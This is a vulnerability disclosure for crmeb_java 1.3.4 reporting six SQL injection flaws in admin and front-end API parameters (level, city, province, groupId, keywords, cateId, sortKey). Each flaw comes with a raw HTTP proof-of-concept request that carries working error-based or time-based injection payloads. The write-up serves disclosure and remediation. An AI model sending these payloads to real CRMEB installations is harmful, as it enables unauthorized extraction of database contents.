# Project
Address: [crmeb_java](https://github.com/crmeb/crmeb_java)

Version: [crmeb_java_1.3.4](https://github.com/crmeb/crmeb_java.git)

# 1 SQL Injection
## 1.1 The level `parameter` is not filtered, resulting in SQL injection

[Suggested description]

There is a SQL Injection vulnerability in crmeb_java <=1.3.4, caused by params `parameter` which are in `${}` format and are not strictly filtered.

[Vendor of Product]

https://github.com/crmeb/crmeb_java

[Affected Product Code Base]

<=1.3.4

[Affected Component]

/api/admin/user/list

POC

```
GET /api/admin/user/list?labelId=&userType=&sex=&isPromoter=&country=&payCount=&accessType=0&dateLimit=&keywords=&province=&city=&page=1&limit=15&level=1+and+extractvalue(1,CONCAT(1,user()))&groupId=&temp=1704955767 HTTP/1.1
Host: 127.0.0.1:8080
Accept: application/json, text/plain, */*
Authori-zation: cc12fe38c271486eb4f1cafbf59a0c41
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Connection: close


```

[Vulnerability recurrence]

The trigger point of the vulnerability is in "User Management" --> "Search".

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/8290d506-967a-44cd-a344-80c498bcb533)

The vulnerability triggering parameter is "level" :

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/f38039a9-27ae-4ab1-87d8-37985c5a946a)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/11953e5c-a301-4eca-8ebf-ce756da32ac2)

[Code analysis]

The corresponding xml file is UserMapper.xml, because it is wrapped by `${`, and this writing will not be pre-compiled, so the vulnerability.

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/c8533dad-f533-4513-9be4-7fa8c8d370f6)

## 1.2 The parameters `city` and `province` are not filtered, resulting in SQL injection

[Suggested description]

CRMEB <=1.3.4 There is an SQL injection vulnerability in parameters `city` and `province` at the interface: /api/admin/user/list, which could allow an attacker to obtain sensitive information from the database.

[Vendor of Product]

https://github.com/crmeb/crmeb_java

[Affected Product Code Base]

<=1.3.4

[Affected Component]

/api/admin/user/list

POC

```
/api/admin/user/list?labelId=&userType=&sex=&isPromoter=&country=foo&payCount=&accessType=0&dateLimit=&keywords=&province=&city=%27%20%41%4e%44%20%47%54%49%44%5f%53%55%42%53%45%54%28%43%4f%4e%43%41%54%28%30%78%37%31%37%61%37%31%36%61%37%31%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28%35%38%31%31%3d%35%38%31%31%2c%31%29%29%29%2c%30%78%37%31%37%30%36%61%37%38%37%31%29%2c%35%38%31%31%29%2d%2d%20%6c%72%68%73&page=1&limit=15&level=&groupId=1&temp=1678934444 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json, text/plain, */*
Authori-zation: f00be952bb304478b7ec43e87f06d0b4


```
OR

```
GET /api/admin/user/list?labelId=&userType=&sex=&isPromoter=&country=foo&payCount=&accessType=0&dateLimit=&keywords=&province=%27%20%41%4e%44%20%47%54%49%44%5f%53%55%42%53%45%54%28%43%4f%4e%43%41%54%28%30%78%37%31%36%61%37%36%36%61%37%31%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28%39%32%34%32%3d%39%32%34%32%2c%31%29%29%29%2c%30%78%37%31%37%31%37%30%36%62%37%31%29%2c%39%32%34%32%29%2d%2d%20%73%50%4b%4c&city=1&page=1&limit=15&level=&groupId=1&temp=1678934444 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json, text/plain, */*
Authori-zation: f00be952bb304478b7ec43e87f06d0b4


```

[Vulnerability recurrence]

The trigger point of the vulnerability is in "User Management" --> "Search".

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/d7db343e-bdeb-462e-bbd8-3c268a410389)

The vulnerability trigger parameter is `city` or `province` :

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/e449196b-b7f2-44c6-99f3-bfc7673c4b6a)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/a24d24e2-d768-4026-9e3c-084ccd1a4dad)

Use sqlmap to get database users:

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/66ee96c7-aaae-4d9b-858c-1bbd80b80308)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/92de51d5-89f4-4e7b-b260-0eda578faf1d)

[Code analysis]

Call: userService.getList() for the next step:

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/fd12ea20-46d4-4bf2-82f4-243097e03a56)

If the `city` parameter is not empty, then encapsulate `province` and `city` together into the Map: 

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/ee885d83-cb49-4c62-bf12-a344f89be102)

After wrapping the map, start calling findAdminList() for processing: 

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/2d305abd-59dc-484d-b56c-bd4494339245)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/8e0831cc-a774-4c2d-afb8-84727e7f91d1)

The corresponding xml file is UserMapper.xml, because it is wrapped by `${`, and this writing will not be precompiled, so the vulnerability. 

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/9b06e31f-8b86-403b-854d-c592976f4180)

## 1.3 The parameters `groupId` are not filtered, resulting in SQL injection

[Suggested description]

CRMEB <=1.3.4 There is an SQL injection vulnerability in parameters `groupId` at the interface: /api/admin/user/list, which could allow an attacker to obtain sensitive information from the database.

[Vendor of Product]

https://github.com/crmeb/crmeb_java

[Affected Product Code Base]

<=1.3.4

[Affected Component]

/api/admin/user/list

POC

```
GET /api/admin/user/list?labelId=&userType=&sex=&isPromoter=&country=foo&payCount=&accessType=0&dateLimit=&keywords=&province=&city=1&page=1&limit=15&level=&groupId=%47%54%49%44%5f%53%55%42%53%45%54%28%43%4f%4e%43%41%54%28%30%78%37%31%37%36%37%36%37%31%37%31%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28%34%35%31%32%3d%34%35%31%32%2c%31%29%29%29%2c%30%78%37%31%36%32%37%30%37%31%37%31%29%2c%34%35%31%32%29&temp=1678934444 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json, text/plain, */*
Authori-zation: f00be952bb304478b7ec43e87f06d0b4


```

[Vulnerability recurrence]

The trigger point of the vulnerability is in "User Management" --> "Search".

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/d7db343e-bdeb-462e-bbd8-3c268a410389)

The vulnerability trigger parameter is "groupId" :

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/fb080b6b-2fb0-45cf-a5b1-81c4d541848d)

Use sqlmap to get database users:

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/f3e0c034-cf98-450d-8ddf-2da9e862cb13)

[Code analysis]

Call: userService.getList() for the next step:

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/9eb36077-ae17-4a53-9b38-518cd487c7ab)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/cfd44309-8170-488f-9f96-79e08997f30c)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/0eb1e9e9-3b62-49ca-bf02-76d317f5a14e)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/46f28e1a-5071-4dfb-b516-b558708abd05)

The corresponding xml file is UserMapper.xml, because it is wrapped by `${`, and this writing will not be pre-compiled, so the vulnerability.

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/17a723e7-ab56-465b-852c-c1dba518dced)


## 1.4 The parameters `keywords` are not filtered, resulting in SQL injection

[Suggested description]

CRMEB < = 1.3.4 at the interface: /api/admin/system/store/order/list, its parameters `keywords` problems of SQL injection, an attacker can get sensitive information in the database through the holes.

[Vendor of Product]

https://github.com/crmeb/crmeb_java

[Affected Product Code Base]

<=1.3.4

[Affected Component]

/api/admin/system/store/order/list

POC

```
POST /api/admin/system/store/order/list?keywords=')%20AND%20(SELECT%201687%20FROM%20(SELECT(SLEEP(1)))Gpwf)%20AND%20('PBkx'='PBkx&storeId=&dateLimit=&page=1&limit=20 HTTP/1.1
Host: 127.0.0.1:8080
Accept: application/json, text/plain, */*
Authori-zation: cc12fe38c271486eb4f1cafbf59a0c41
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Connection: close


```

[Vulnerability recurrence]

Trigger point of vulnerability In the "cancel order", enter the keyword, it can be triggered:

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/3054f8f1-d914-404e-9c28-db6a1a4fe0d4)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/0b1d14f9-1ad9-40a0-97c8-862496aa67c9)

Next, burst the database user with sqlmap: 

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/d13aa778-457d-4a39-bc67-0782607536c8)

[Code analysis]

Call: getWriteOffList(request, pageParamRequest) for processing:

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/e9d13727-b19d-40cd-8ada-2095f9df9cfe)

Here, you simply concatenate the keywords directly, resulting in SQL injection problems.

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/40028dcf-a3b0-453d-bd68-20211b30d003)

## 1.5 The parameters `cateId` are not filtered, resulting in SQL injection

[Suggested description]

CRMEB < = 1.3.4 at the interface: /api/admin/store/product/list, the problems of SQL injection parameters `cateId`, an attacker can get sensitive information in the database through the holes.

[Vendor of Product]

https://github.com/crmeb/crmeb_java

[Affected Product Code Base]

<=1.3.4

[Affected Component]

/api/admin/store/product/list

POC

```
GET /api/admin/store/product/list?page=1&limit=20&cateId=%27%7c%7c%28%53%45%4c%45%43%54%20%30%78%36%66%37%32%35%37%34%39%20%57%48%45%52%45%20%35%39%34%39%3d%35%39%34%39%20%41%4e%44%20%28%53%45%4c%45%43%54%20%37%33%37%33%20%46%52%4f%4d%20%28%53%45%4c%45%43%54%28%53%4c%45%45%50%28%35%29%29%29%58%63%66%71%29%29%7c%7c%27&keywords=&type=1&temp=1704961431 HTTP/1.1
Host: 127.0.0.1:8080
Authori-zation: cc12fe38c271486eb4f1cafbf59a0c41
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Connection: close


```

[Vulnerability recurrence]

The trigger point of the vulnerability is in "Home" --> "Product" --> "Product Management" :

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/571e1085-1a73-4ff9-aa73-b4176555afcb)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/a86f6963-dbd6-4a14-9048-4af3f7589abe)

Next, burst the database user with sqlmap:

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/7b1a30c2-bc7d-4fa2-bfef-a419474ec45e)

[Code analysis]

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/f4fed5ac-0d43-4825-8559-6d2a57c72975)

In getAdminList(), concatenate `cateId` directly, resulting in SQL injection problems:

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/aaebae17-401d-43ed-bd84-e62d4bade3b7)

## 1.6 The parameters `sortKey` are not filtered, resulting in SQL injection

[Suggested description]

CRMEB <=1.3.4 There is an SQL injection vulnerability in parameters `sortKey` at the interface: /api/front/spread/people, which could allow an attacker to obtain sensitive information from the database.

[Vendor of Product]

https://github.com/crmeb/crmeb_java

[Affected Product Code Base]

<=1.3.4

[Affected Component]

/api/front/spread/people

POC

```
GET /api/front/spread/people?sortKey=updatexml(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()),0x7e),1) HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
content-type: application/json
Authori-zation: dbdd777e27b94979adf06fc3fd20ee68


```

[Vulnerability recurrence]

Make sure you have at least two promoters.

The vulnerability trigger parameter is `sortKey` :

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/1062afd8-306a-47a9-bed4-666edb059de6)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/a408c43c-04ca-4cc9-84de-6025a9e923bf)

[Code analysis]

Call getSpreadPeopleList() from the interface: /spread/people:

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/b6b3723a-ce53-4b3f-a81d-1bee0b9923bb)

When the user has two promoters, namely call userService. GetSpreadPeopleList ()

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/7c7f7e68-5720-41a6-b317-c83f22218e32)

The corresponding xml file is UserMapper.xml, because it is wrapped by `${`, and this writing will not be pre-compiled, so the vulnerability.

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/6a31ad28-c983-4cf6-a0f8-9ff1e502c21d)




















































